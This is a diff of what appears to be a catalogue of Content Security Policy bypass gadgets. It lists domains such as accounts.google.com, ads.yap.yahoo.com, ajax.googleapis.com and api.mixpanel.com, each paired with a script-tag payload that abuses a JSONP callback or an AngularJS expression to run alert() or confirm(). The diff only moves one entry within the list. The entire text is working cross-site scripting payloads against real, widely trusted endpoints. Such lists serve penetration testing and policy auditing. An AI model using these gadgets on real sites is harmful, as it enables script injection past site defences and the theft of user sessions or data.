@@ -1,5 +1,4 @@
 Domain	Code
-erp.financialforce.com <script src="https://erp.financialforce.com/index.php/form/getKnownLead?munchkinId=572-XMB-986&callback=alert"></script>
 accounts.google.com <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
 ajax.googleapis.com	<body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -175,3 +174,4 @@ api.mixpanel.com 	<script src="https://api.mixpanel.com/track/?callback=alert(13
 www.travelpayouts.com	<script src="https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)"></script>
 ads.pictela.net	<script src="http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json"></script>
 adserver.adtechus.com	<script src="https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1>
+erp.financialforce.com  <script src="https://erp.financialforce.com/index.php/form/getKnownLead?munchkinId=572-XMB-986&callback=alert"></script>
